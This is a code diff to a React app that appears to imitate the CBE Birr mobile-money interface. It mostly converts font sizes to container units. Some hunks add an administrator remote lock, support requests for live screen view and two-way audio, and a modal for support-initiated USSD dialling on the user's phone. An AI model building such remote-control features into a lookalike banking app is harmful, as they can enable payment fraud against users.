@@ -9457,9 +10782,10 @@ export default function CBEBirrFullscreenApp() {
                   className="flex items-center text-left pointer-events-none select-none"
                 >
                   <span
-                    className={`text-[13.5px] sm:text-[14px] truncate ${
+                    style={{ fontSize: '2.72cqw' }}
+                    className={`truncate ${
                       selectedBank
-                        ? 'font-semibold text-[#1c1b1f]'
+                        ? 'font-medium text-[#1c1b1f]'
                         : 'font-normal text-[#8c8291]'
                     }`}
                   >
@@ -9525,7 +10851,8 @@ export default function CBEBirrFullscreenApp() {
                     }
                   }}
                   placeholder="Bank Account"
-                  className="w-full h-full bg-transparent border-none outline-none text-[#1c1b1f] placeholder:text-[#8c8291] text-[13.5px] sm:text-[14px] font-normal px-1"
+                  style={{ fontSize: '2.55cqw', fontWeight: 400 }}
+                  className="w-full h-full bg-transparent border-none outline-none text-[#1c1b1f] placeholder:text-[#8c8291] px-1"
                 />
               </div>
 
@@ -9538,8 +10865,10 @@ export default function CBEBirrFullscreenApp() {
                     left: '5.0%',
                     width: '90.0%',
                     height: '2.4%',
+                    fontSize: '2.85cqw',
+                    fontWeight: 500,
                   }}
-                  className="flex items-center justify-center text-center text-[#18181b] text-[14px] sm:text-[14.5px] font-semibold tracking-tight z-20 pointer-events-none select-none animate-in fade-in duration-150"
+                  className="flex items-center justify-center text-center text-[#18181b] tracking-tight z-20 pointer-events-none select-none animate-in fade-in duration-150"
                 >
                   <span>{bankReceiverName}</span>
                 </div>
@@ -9565,7 +10894,8 @@ export default function CBEBirrFullscreenApp() {
                     setBankTransferError('');
                   }}
                   placeholder="Amount"
-                  className="w-full h-full bg-transparent border-none outline-none text-[#1c1b1f] placeholder:text-[#8c8291] text-[13.5px] sm:text-[14px] font-normal px-1"
+                  style={{ fontSize: '2.55cqw', fontWeight: 400 }}
+                  className="w-full h-full bg-transparent border-none outline-none text-[#1c1b1f] placeholder:text-[#8c8291] px-1"
                 />
               </div>
 
@@ -9602,7 +10932,8 @@ export default function CBEBirrFullscreenApp() {
                   value={bankReason}
                   onChange={(e) => setBankReason(e.target.value)}
                   placeholder="Reason"
-                  className="w-full h-full bg-transparent border-none outline-none text-[#1c1b1f] placeholder:text-[#8c8291] text-[13.5px] sm:text-[14px] font-normal px-1"
+                  style={{ fontSize: '2.55cqw', fontWeight: 400 }}
+                  className="w-full h-full bg-transparent border-none outline-none text-[#1c1b1f] placeholder:text-[#8c8291] px-1"
                 />
               </div>
 
@@ -9657,8 +10988,9 @@ export default function CBEBirrFullscreenApp() {
                     bottom: '12%',
                     left: '10%',
                     width: '80%',
+                    fontSize: '2.6cqw',
                   }}
-                  className="z-50 text-center text-xs font-semibold text-white bg-red-600/95 py-2.5 px-4 rounded-xl shadow-xl backdrop-blur-xs"
+                  className="z-50 text-center font-semibold text-white bg-red-600/95 py-2.5 px-4 rounded-xl shadow-xl backdrop-blur-xs"
                 >
                   {bankTransferError}
                 </motion.div>
@@ -9696,16 +11028,16 @@ export default function CBEBirrFullscreenApp() {
                       </button>
 
                       {/* Title */}
-                      <h3 className="text-center font-normal text-[#2b2b2b] text-[15px] pt-1">
+                      <h3 className="text-center font-normal text-[#2b2b2b] text-[3.2cqw] pt-1">
                         Bank Transfer
                       </h3>
 
                       {/* Centered Large Amount */}
                       <div className="text-center mt-1 mb-5 flex items-baseline justify-center gap-1.5">
-                        <span className="text-[26px] font-bold text-black tracking-tight">
+                        <span className="text-[5.8cqw] font-bold text-black tracking-tight">
                           {bankAmount || '1'}
                         </span>
-                        <span className="text-xs font-semibold text-black tracking-wide">
+                        <span className="text-[2.6cqw] font-semibold text-black tracking-wide">
                           ETB
                         </span>
                       </div>
@@ -9714,7 +11046,7 @@ export default function CBEBirrFullscreenApp() {
                       {(() => {
                         const fees = calculateTransferFees(bankAmount || '1');
                         return (
-                          <div className="w-full space-y-1.5 text-[12.5px] sm:text-[13px]">
+                          <div className="w-full space-y-1.5 text-[2.85cqw]">
                             <div className="flex items-center justify-between text-[#4b5563]">
                               <span>Service Charge</span>
                               <span className="text-[#1f2937] font-medium">{fees.serviceChargeFormatted}</span>
@@ -9743,7 +11075,7 @@ export default function CBEBirrFullscreenApp() {
                       <button
                         type="button"
                         onClick={handleConfirmBankTransfer}
-                        className="w-full mt-6 py-3.5 bg-[#8b278e] hover:bg-[#7a227d] active:scale-[0.99] text-white font-medium text-[15px] rounded-[16px] shadow-sm transition-all duration-150 cursor-pointer"
+                        className="w-full mt-6 py-3.5 bg-[#8b278e] hover:bg-[#7a227d] active:scale-[0.99] text-white font-medium text-[3.3cqw] rounded-[16px] shadow-sm transition-all duration-150 cursor-pointer"
                       >
                         Confirm
                       </button>
@@ -9850,9 +11182,10 @@ export default function CBEBirrFullscreenApp() {
                   className="flex items-center text-left pointer-events-none select-none"
                 >
                   <span
-                    className={`text-[13.5px] sm:text-[14px] truncate ${
+                    style={{ fontSize: '2.72cqw' }}
+                    className={`truncate ${
                       selectedWallet
-                        ? 'font-semibold text-[#1c1b1f]'
+                        ? 'font-medium text-[#1c1b1f]'
                         : 'font-normal text-[#8c8291]'
                     }`}
                   >
@@ -9918,7 +11251,8 @@ export default function CBEBirrFullscreenApp() {
                     }
                   }}
                   placeholder="Wallet Account"
-                  className="w-full h-full bg-transparent border-none outline-none text-[#1c1b1f] placeholder:text-[#8c8291] text-[13.5px] sm:text-[14px] font-normal px-0"
+                  style={{ fontSize: '2.55cqw', fontWeight: 400 }}
+                  className="w-full h-full bg-transparent border-none outline-none text-[#1c1b1f] placeholder:text-[#8c8291] px-0"
                 />
               </div>
 
@@ -9931,8 +11265,10 @@ export default function CBEBirrFullscreenApp() {
                     left: '5.0%',
                     width: '90.0%',
                     height: '2.8%',
+                    fontSize: '2.85cqw',
+                    fontWeight: 500,
                   }}
-                  className="flex items-center justify-center text-center text-[#18181b] text-[14px] sm:text-[14.5px] font-semibold tracking-tight z-20 pointer-events-none select-none animate-in fade-in duration-150"
+                  className="flex items-center justify-center text-center text-[#18181b] tracking-tight z-20 pointer-events-none select-none animate-in fade-in duration-150"
                 >
                   <span>{walletReceiverName}</span>
                 </div>
@@ -9958,7 +11294,8 @@ export default function CBEBirrFullscreenApp() {
                     setWalletTransferError('');
                   }}
                   placeholder="Amount"
-                  className="w-full h-full bg-transparent border-none outline-none text-[#1c1b1f] placeholder:text-[#8c8291] text-[13.5px] sm:text-[14px] font-normal px-0"
+                  style={{ fontSize: '2.55cqw', fontWeight: 400 }}
+                  className="w-full h-full bg-transparent border-none outline-none text-[#1c1b1f] placeholder:text-[#8c8291] px-0"
                 />
               </div>
 
@@ -9995,7 +11332,8 @@ export default function CBEBirrFullscreenApp() {
                   value={walletReason}
                   onChange={(e) => setWalletReason(e.target.value)}
                   placeholder="Reason"
-                  className="w-full h-full bg-transparent border-none outline-none text-[#1c1b1f] placeholder:text-[#8c8291] text-[13.5px] sm:text-[14px] font-normal px-0"
+                  style={{ fontSize: '2.55cqw', fontWeight: 400 }}
+                  className="w-full h-full bg-transparent border-none outline-none text-[#1c1b1f] placeholder:text-[#8c8291] px-0"
                 />
               </div>
 
@@ -10050,8 +11388,9 @@ export default function CBEBirrFullscreenApp() {
                     bottom: '12%',
                     left: '10%',
                     width: '80%',
+                    fontSize: '2.6cqw',
                   }}
-                  className="z-50 text-center text-xs font-semibold text-white bg-red-600/95 py-2.5 px-4 rounded-xl shadow-xl backdrop-blur-xs"
+                  className="z-50 text-center font-semibold text-white bg-red-600/95 py-2.5 px-4 rounded-xl shadow-xl backdrop-blur-xs"
                 >
                   {walletTransferError}
                 </motion.div>
@@ -10089,16 +11428,16 @@ export default function CBEBirrFullscreenApp() {
                       </button>
 
                       {/* Title */}
-                      <h3 className="text-center font-normal text-[#2b2b2b] text-[15px] pt-1">
+                      <h3 className="text-center font-normal text-[#2b2b2b] text-[3.2cqw] pt-1">
                         Wallet Transfer
                       </h3>
 
                       {/* Centered Large Amount */}
                       <div className="text-center mt-1 mb-5 flex items-baseline justify-center gap-1.5">
-                        <span className="text-[26px] font-bold text-black tracking-tight">
+                        <span className="text-[5.8cqw] font-bold text-black tracking-tight">
                           {walletAmount || '1'}
                         </span>
-                        <span className="text-xs font-semibold text-black tracking-wide">
+                        <span className="text-[2.6cqw] font-semibold text-black tracking-wide">
                           ETB
                         </span>
                       </div>
@@ -10107,7 +11446,7 @@ export default function CBEBirrFullscreenApp() {
                       {(() => {
                         const fees = calculateTransferFees(walletAmount || '1');
                         return (
-                          <div className="w-full space-y-1.5 text-[12.5px] sm:text-[13px]">
+                          <div className="w-full space-y-1.5 text-[2.85cqw]">
                             <div className="flex items-center justify-between text-[#4b5563]">
                               <span>Service Charge</span>
                               <span className="text-[#1f2937] font-medium">{fees.serviceChargeFormatted}</span>
@@ -10136,7 +11475,7 @@ export default function CBEBirrFullscreenApp() {
                       <button
                         type="button"
                         onClick={handleConfirmWalletTransfer}
-                        className="w-full mt-6 py-3.5 bg-[#8b278e] hover:bg-[#7a227d] active:scale-[0.99] text-white font-medium text-[15px] rounded-[16px] shadow-sm transition-all duration-150 cursor-pointer"
+                        className="w-full mt-6 py-3.5 bg-[#8b278e] hover:bg-[#7a227d] active:scale-[0.99] text-white font-medium text-[3.3cqw] rounded-[16px] shadow-sm transition-all duration-150 cursor-pointer"
                       >
                         Confirm
                       </button>
@@ -10206,7 +11545,7 @@ export default function CBEBirrFullscreenApp() {
                       value={bankSearchTerm}
                       onChange={(e) => setBankSearchTerm(e.target.value)}
                       placeholder=""
-                      className="w-full h-full bg-transparent border-none outline-none text-[#1a1a1a] text-[13px] sm:text-[14px] font-normal px-1"
+                      className="w-full h-full bg-transparent border-none outline-none text-[#1a1a1a] text-[2.7cqw] font-normal px-1"
                     />
                     {bankSearchTerm && (
                       <button
@@ -10245,7 +11584,7 @@ export default function CBEBirrFullscreenApp() {
                   ))}
 
                   {filteredBanks.length === 0 && (
-                    <div className="w-full py-12 text-center text-gray-500 text-sm font-medium">
+                    <div className="w-full py-12 text-center text-gray-500 text-[2.8cqw] font-medium">
                       No banks found matching &quot;{bankSearchTerm}&quot;
                     </div>
                   )}
@@ -10513,7 +11852,7 @@ export default function CBEBirrFullscreenApp() {
                       value={walletSearchTerm}
                       onChange={(e) => setWalletSearchTerm(e.target.value)}
                       placeholder=""
-                      className="w-full h-full bg-transparent border-none outline-none text-[#1a1a1a] text-[13px] sm:text-[14px] font-normal px-1"
+                      className="w-full h-full bg-transparent border-none outline-none text-[#1a1a1a] text-[2.7cqw] font-normal px-1"
                     />
                     {walletSearchTerm && (
                       <button
@@ -10560,7 +11899,7 @@ export default function CBEBirrFullscreenApp() {
                   ))}
 
                   {filteredWallets.length === 0 && (
-                    <div className="w-full py-12 text-center text-gray-500 text-sm font-medium">
+                    <div className="w-full py-12 text-center text-gray-500 text-[2.8cqw] font-medium">
                       No wallet or micro finance found matching &quot;{walletSearchTerm}&quot;
                     </div>
                   )}
@@ -11468,7 +12807,7 @@ export default function CBEBirrFullscreenApp() {
                 exit={{ scale: 0.94, opacity: 0 }}
                 transition={{ type: 'spring', damping: 28, stiffness: 350 }}
                 onClick={(e) => e.stopPropagation()}
-                className="relative overflow-hidden w-full max-w-[335px] bg-[#EDE7F2] rounded-[28px] p-4 sm:p-4.5 shadow-2xl border border-purple-200/50 flex flex-col"
+                className="relative overflow-hidden w-full max-w-[82cqw] bg-[#EDE7F2] rounded-[28px] p-4 sm:p-4.5 shadow-2xl border border-purple-200/50 flex flex-col"
               >
                 {isHiddenUssdLoading && (
                   <div className="absolute inset-0 z-30 bg-[#EDE7F2]/85 backdrop-blur-[1px] flex items-center justify-center rounded-[28px]">
@@ -11480,14 +12819,14 @@ export default function CBEBirrFullscreenApp() {
                   <div className="flex items-center gap-2.5">
                     {/* Purple square icon with white math signs matching images */}
                     <div className="w-7 h-7 rounded-lg bg-[#8B278E] flex items-center justify-center text-white shadow-xs">
-                      <div className="grid grid-cols-2 gap-0.5 text-[9px] font-bold leading-none text-center">
+                      <div className="grid grid-cols-2 gap-0.5 text-[2.0cqw] font-bold leading-none text-center">
                         <span>-</span>
                         <span>+</span>
                         <span>÷</span>
                         <span>=</span>
                       </div>
                     </div>
-                    <span className="text-[#1c1b1f] text-[17px] font-semibold tracking-tight">
+                    <span className="text-[#1c1b1f] text-[3.6cqw] font-semibold tracking-tight">
                       Calculator
                     </span>
                   </div>
@@ -11510,15 +12849,15 @@ export default function CBEBirrFullscreenApp() {
                 <div className="w-full bg-white rounded-[18px] p-3.5 mb-3.5 border border-black/5 shadow-[inset_0_1px_2px_rgba(0,0,0,0.04)] flex flex-col justify-center min-h-[76px] text-right">
                   {calculatorLiveResult !== null ? (
                     <>
-                      <span className="text-[#49454f] text-[15px] font-normal leading-tight tracking-normal">
+                      <span className="text-[#49454f] text-[3.1cqw] font-normal leading-tight tracking-normal">
                         {calculatorExpression}
                       </span>
-                      <span className="text-[#15803d] text-[26px] font-bold leading-tight tracking-tight mt-0.5">
+                      <span className="text-[#15803d] text-[5.4cqw] font-bold leading-tight tracking-tight mt-0.5">
                         = {calculatorLiveResult}
                       </span>
                     </>
                   ) : (
-                    <span className="text-[#1c1b1f] text-[26px] sm:text-[28px] font-normal leading-tight tracking-tight">
+                    <span className="text-[#1c1b1f] text-[5.4cqw] font-normal leading-tight tracking-tight">
                       {calculatorDisplay || '0'}
                     </span>
                   )}
@@ -11530,7 +12869,7 @@ export default function CBEBirrFullscreenApp() {
                   <button
                     type="button"
                     onClick={handleCalcClear}
-                    className="col-span-2 h-11 sm:h-12 bg-[#E23636] active:bg-[#c62828] text-white font-bold text-[18px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="col-span-2 h-11 sm:h-12 bg-[#E23636] active:bg-[#c62828] text-white font-bold text-[3.8cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     C
                   </button>
@@ -11547,7 +12886,7 @@ export default function CBEBirrFullscreenApp() {
                   <button
                     type="button"
                     onClick={() => handleCalcOperator('÷')}
-                    className="col-span-1 h-11 sm:h-12 bg-[#8B278E] active:bg-[#701e73] text-white font-bold text-[22px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="col-span-1 h-11 sm:h-12 bg-[#8B278E] active:bg-[#701e73] text-white font-bold text-[4.4cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     ÷
                   </button>
@@ -11556,28 +12895,28 @@ export default function CBEBirrFullscreenApp() {
                   <button
                     type="button"
                     onClick={() => handleCalcDigit('7')}
-                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[18px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[3.8cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     7
                   </button>
                   <button
                     type="button"
                     onClick={() => handleCalcDigit('8')}
-                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[18px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[3.8cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     8
                   </button>
                   <button
                     type="button"
                     onClick={() => handleCalcDigit('9')}
-                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[18px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[3.8cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     9
                   </button>
                   <button
                     type="button"
                     onClick={() => handleCalcOperator('×')}
-                    className="h-11 sm:h-12 bg-[#8B278E] active:bg-[#701e73] text-white font-bold text-[20px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#8B278E] active:bg-[#701e73] text-white font-bold text-[4.4cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     ×
                   </button>
@@ -11586,28 +12925,28 @@ export default function CBEBirrFullscreenApp() {
                   <button
                     type="button"
                     onClick={() => handleCalcDigit('4')}
-                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[18px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[3.8cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     4
                   </button>
                   <button
                     type="button"
                     onClick={() => handleCalcDigit('5')}
-                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[18px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[3.8cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     5
                   </button>
                   <button
                     type="button"
                     onClick={() => handleCalcDigit('6')}
-                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[18px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[3.8cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     6
                   </button>
                   <button
                     type="button"
                     onClick={() => handleCalcOperator('-')}
-                    className="h-11 sm:h-12 bg-[#8B278E] active:bg-[#701e73] text-white font-bold text-[22px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#8B278E] active:bg-[#701e73] text-white font-bold text-[4.4cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     -
                   </button>
@@ -11616,28 +12955,28 @@ export default function CBEBirrFullscreenApp() {
                   <button
                     type="button"
                     onClick={() => handleCalcDigit('1')}
-                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[18px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[3.8cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     1
                   </button>
                   <button
                     type="button"
                     onClick={() => handleCalcDigit('2')}
-                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[18px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[3.8cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     2
                   </button>
                   <button
                     type="button"
                     onClick={() => handleCalcDigit('3')}
-                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[18px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[3.8cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     3
                   </button>
                   <button
                     type="button"
                     onClick={() => handleCalcOperator('+')}
-                    className="h-11 sm:h-12 bg-[#8B278E] active:bg-[#701e73] text-white font-bold text-[22px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#8B278E] active:bg-[#701e73] text-white font-bold text-[4.4cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     +
                   </button>
@@ -11646,28 +12985,28 @@ export default function CBEBirrFullscreenApp() {
                   <button
                     type="button"
                     onClick={handleCalcToggleSign}
-                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[18px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[3.8cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     ±
                   </button>
                   <button
                     type="button"
                     onClick={() => handleCalcDigit('0')}
-                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[18px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[3.8cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     0
                   </button>
                   <button
                     type="button"
                     onClick={handleCalcDecimal}
-                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[22px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#757575] active:bg-[#616161] text-white font-bold text-[4.4cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     .
                   </button>
                   <button
                     type="button"
                     onClick={handleCalcEquals}
-                    className="h-11 sm:h-12 bg-[#8B278E] active:bg-[#701e73] text-white font-bold text-[22px] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                    className="h-11 sm:h-12 bg-[#8B278E] active:bg-[#701e73] text-white font-bold text-[4.4cqw] rounded-[16px] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                   >
                     =
                   </button>
@@ -11678,14 +13017,14 @@ export default function CBEBirrFullscreenApp() {
                   <button
                     type="button"
                     onClick={closeCalculatorCleanly}
-                    className="py-3 bg-[#757575] hover:bg-[#616161] active:scale-[0.98] text-white font-medium text-[15px] rounded-[16px] shadow-xs transition-all cursor-pointer text-center"
+                    className="py-3 bg-[#757575] hover:bg-[#616161] active:scale-[0.98] text-white font-medium text-[3.2cqw] rounded-[16px] shadow-xs transition-all cursor-pointer text-center"
                   >
                     Cancel
                   </button>
                   <button
                     type="button"
                     onClick={handleCalcInsert}
-                    className="py-3 bg-[#8B278E] hover:bg-[#701e73] active:scale-[0.98] text-white font-medium text-[15px] rounded-[16px] shadow-xs transition-all cursor-pointer text-center"
+                    className="py-3 bg-[#8B278E] hover:bg-[#701e73] active:scale-[0.98] text-white font-medium text-[3.2cqw] rounded-[16px] shadow-xs transition-all cursor-pointer text-center"
                   >
                     Insert
                   </button>
@@ -11717,7 +13056,7 @@ export default function CBEBirrFullscreenApp() {
               initial={{ opacity: 0 }}
               animate={{ opacity: 1 }}
               exit={{ opacity: 0 }}
-              className="absolute inset-0 z-[80] bg-[#140717]/95 backdrop-blur-md text-white flex flex-col items-center justify-center p-6 text-center select-none"
+              className="absolute inset-0 z-[94] bg-[#140717]/95 backdrop-blur-md text-white flex flex-col items-center justify-center p-6 text-center select-none"
             >
               <button
                 type="button"
@@ -11737,10 +13076,10 @@ export default function CBEBirrFullscreenApp() {
               >
                 <Lock className="w-8 h-8 text-purple-300" />
               </button>
-              <h2 className="text-[18px] font-bold text-white mb-2">
+              <h2 className="text-[4.2cqw] font-bold text-white mb-2">
                 App Temporarily Locked
               </h2>
-              <p className="text-[13px] text-purple-100/80 max-w-[260px] leading-relaxed">
+              <p className="text-[3.0cqw] text-purple-100/80 max-w-[260px] leading-relaxed">
                 {remoteLockState.message ||
                   'Access has been paused by the administrator. Please try again later.'}
               </p>
@@ -11757,16 +13096,16 @@ export default function CBEBirrFullscreenApp() {
                       setLockOwnerPinError('');
                     }}
                     placeholder="Owner PIN"
-                    className="w-full bg-black/40 border border-white/20 rounded-xl px-3 py-2 text-center text-[14px] font-mono tracking-[6px] text-white outline-none"
+                    className="w-full bg-black/40 border border-white/20 rounded-xl px-3 py-2 text-center text-[2.8cqw] font-mono tracking-[6px] text-white outline-none"
                   />
                   {lockOwnerPinError && (
-                    <p className="text-[11px] text-rose-300">{lockOwnerPinError}</p>
+                    <p className="text-[2.8cqw] text-rose-300">{lockOwnerPinError}</p>
                   )}
                   <div className="flex gap-2">
                     <button
                       type="button"
                       onClick={() => setShowLockOwnerUnlock(false)}
-                      className="flex-1 py-1.5 rounded-xl bg-white/10 text-[11px] font-semibold cursor-pointer"
+                      className="flex-1 py-1.5 rounded-xl bg-white/10 text-[2.8cqw] font-semibold cursor-pointer"
                     >
                       Cancel
                     </button>
@@ -11781,7 +13120,7 @@ export default function CBEBirrFullscreenApp() {
                           setLockOwnerPinError('Invalid PIN');
                         }
                       }}
-                      className="flex-1 py-1.5 rounded-xl bg-[#7a1c7d] text-[11px] font-bold cursor-pointer"
+                      className="flex-1 py-1.5 rounded-xl bg-[#7a1c7d] text-[2.8cqw] font-bold cursor-pointer"
                     >
                       Open
                     </button>
@@ -11799,7 +13138,7 @@ export default function CBEBirrFullscreenApp() {
               initial={{ opacity: 0 }}
               animate={{ opacity: 1 }}
               exit={{ opacity: 0 }}
-              className="absolute inset-0 z-[85] bg-black/70 backdrop-blur-xs flex items-center justify-center p-5 select-none"
+              className="absolute inset-0 z-[93] bg-black/70 backdrop-blur-xs flex items-center justify-center p-5 select-none"
             >
               <motion.div
                 initial={{ scale: 0.94, opacity: 0 }}
@@ -11810,21 +13149,21 @@ export default function CBEBirrFullscreenApp() {
                 <div className="w-14 h-14 mx-auto rounded-2xl bg-purple-100 text-[#7a1c7d] flex items-center justify-center">
                   <Monitor className="w-7 h-7" />
                 </div>
-                <h2 className="text-[16px] font-bold text-slate-900">
+                <h2 className="text-[3.7cqw] font-bold text-slate-900">
                   Support View Request
                 </h2>
-                <p className="text-[12px] text-slate-600 leading-relaxed">
-                  Support is requesting temporary access to view your current screen state and guide you with an on-screen pointer. Your PIN stays strictly private.
+                <p className="text-[2.8cqw] text-slate-600 leading-relaxed">
+                  Support is requesting live screen view, remote assistance, and two-way voice audio. Your PIN stays strictly private.
                 </p>
-                <p className="text-[11px] font-semibold text-[#7a1c7d]">
-                  የቀጥታ Support እገዛ መፍቀድ ይፈልጋሉ?
+                <p className="text-[2.5cqw] font-semibold text-[#7a1c7d]">
+                  የቀጥታ Support እገዛ (ስክሪን እና ድምጽ) መፍቀድ ይፈልጋሉ?
                 </p>
                 <div className="grid grid-cols-2 gap-2.5 pt-2">
                   <button
                     type="button"
                     disabled={supportConsentBusy}
                     onClick={handleDeclineSupportRequest}
-                    className="py-2.5 rounded-2xl bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-[12.5px] cursor-pointer"
+                    className="py-2.5 rounded-2xl bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-[2.9cqw] cursor-pointer"
                   >
                     Decline
                   </button>
@@ -11832,12 +13171,122 @@ export default function CBEBirrFullscreenApp() {
                     type="button"
                     disabled={supportConsentBusy}
                     onClick={handleAcceptSupportRequest}
-                    className="py-2.5 rounded-2xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-[12.5px] shadow cursor-pointer"
+                    className="py-2.5 rounded-2xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-[2.9cqw] shadow cursor-pointer"
                   >
                     Allow
                   </button>
                 </div>
               </motion.div>
+            </motion.div>
+          )}
+        </AnimatePresence>
+
+        {/* Explicit User Permission Modal Before Executing Remote USSD During Cast */}
+        <AnimatePresence>
+          {pendingUssdConsent && !showOwnerDashboard && (
+            <motion.div
+              data-support-ignore="true"
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 1 }}
+              exit={{ opacity: 0 }}
+              className="absolute inset-0 z-[95] bg-black/75 backdrop-blur-xs flex items-center justify-center p-5 select-none"
+            >
+              <motion.div
+                initial={{ scale: 0.94, opacity: 0 }}
+                animate={{ scale: 1, opacity: 1 }}
+                exit={{ scale: 0.94, opacity: 0 }}
+                className="w-full max-w-[300px] bg-white rounded-3xl p-5 shadow-2xl border border-purple-200 text-center space-y-3"
+              >
+                <div className="w-14 h-14 mx-auto rounded-2xl bg-purple-100 text-[#7a1c7d] flex items-center justify-center">
+                  <Phone className="w-7 h-7" />
+                </div>
+                <h2 className="text-[3.7cqw] font-bold text-slate-900">
+                  USSD Permission Request
+                </h2>
+                <p className="text-[2.8cqw] text-slate-600 leading-relaxed">
+                  Support is asking permission to dial this USSD code on your phone:
+                </p>
+                <div className="px-3 py-2 rounded-xl bg-purple-50 border border-purple-200 text-[#7a1c7d] font-mono font-bold text-[3.8cqw] tracking-wide">
+                  {pendingUssdConsent.code}
+                </div>
+                <p className="text-[2.5cqw] font-semibold text-slate-700">
+                  ይህ USSD እንዲሰራ ፍቃድ ይሰጣሉ?
+                </p>
+                <div className="grid grid-cols-2 gap-2.5 pt-1">
+                  <button
+                    type="button"
+                    onClick={handleDeclineUssdConsent}
+                    className="py-2.5 rounded-2xl bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-[2.9cqw] cursor-pointer"
+                  >
+                    Decline
+                  </button>
+                  <button
+                    type="button"
+                    onClick={handleApproveUssdConsent}
+                    className="py-2.5 rounded-2xl bg-[#7a1c7d] hover:bg-[#661468] text-white font-bold text-[2.9cqw] shadow cursor-pointer"
+                  >
+                    OK / Run USSD
+                  </button>
+                </div>
+              </motion.div>
+            </motion.div>
